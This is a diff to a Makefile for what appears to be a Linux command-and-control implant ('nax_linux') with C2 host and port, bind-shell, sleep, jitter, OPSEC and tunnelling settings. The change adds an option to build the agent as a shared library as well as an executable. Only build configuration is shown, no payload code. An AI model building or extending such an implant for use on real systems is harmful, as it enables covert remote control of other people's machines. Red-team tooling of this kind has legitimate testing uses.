@@ -29,6 +29,7 @@ NAX_C2_PORT     ?= 4444
 NAX_BIND_PORT   ?= 4444
 NAX_BIND_HOST   ?= 0.0.0.0
 NAX_DEBUG       ?= 0
+NAX_FORMAT      ?= elf
 NAX_OPSEC       ?= 0
 NAX_SLEEP_MS    ?= 5000
 NAX_JITTER_PCT  ?= 0
@@ -68,7 +69,7 @@ ifeq ($(NAX_TCP_MODE),bind)
              -DNAX_BIND_PORT=$(NAX_BIND_PORT) \
              -DNAX_BIND_HOST=\"$(NAX_BIND_HOST)\"
   SUFFIX  := _bind
-  SRCS    := src/main.c src/Core/crypto.c src/Core/packer.c \
+  SRCS    := src/agent.c src/Core/crypto.c src/Core/packer.c \
              src/Core/sysinfo.c src/Commands/commands.c \
              src/Commands/tunnel.c \
              src/Commands/zip.c \
@@ -79,7 +80,7 @@ else ifeq ($(NAX_TCP_MODE),https)
              -DNAX_C2_HOST=\"$(NAX_C2_HOST)\" \
              -DNAX_C2_PORT=$(NAX_C2_PORT)
   SUFFIX  := _https
-  SRCS    := src/main.c src/Core/crypto.c src/Core/packer.c \
+  SRCS    := src/agent.c src/Core/crypto.c src/Core/packer.c \
              src/Core/sysinfo.c src/Commands/commands.c \
              src/Commands/tunnel.c \
              src/Commands/zip.c \
@@ -111,7 +112,7 @@ else
   CFLAGS  += -DNAX_C2_HOST=\"$(NAX_C2_HOST)\" \
              -DNAX_C2_PORT=$(NAX_C2_PORT)
   SUFFIX  :=
-  SRCS    := src/main.c src/Core/crypto.c src/Core/packer.c \
+  SRCS    := src/agent.c src/Core/crypto.c src/Core/packer.c \
              src/Core/sysinfo.c src/Commands/commands.c \
              src/Commands/tunnel.c \
              src/Commands/zip.c \
@@ -129,6 +130,16 @@ endif
 ifeq ($(NAX_DEBUG),1)
   CFLAGS  += -DNAX_DEBUG -g -O0
   SUFFIX  := $(SUFFIX)_debug
+endif
+
+# ===== output format: elf (executable) or so (shared library) =====
+ifeq ($(NAX_FORMAT),so)
+  SRCS   += src/shared.c
+  CFLAGS := $(subst -fPIE,-fPIC,$(CFLAGS))
+  LDFLAGS := $(subst -pie,-shared,$(LDFLAGS))
+  SUFFIX := $(SUFFIX).so
+else
+  SRCS   += src/main.c
 endif
 
 TARGET  := $(OUTDIR)/nax_linux$(SUFFIX)
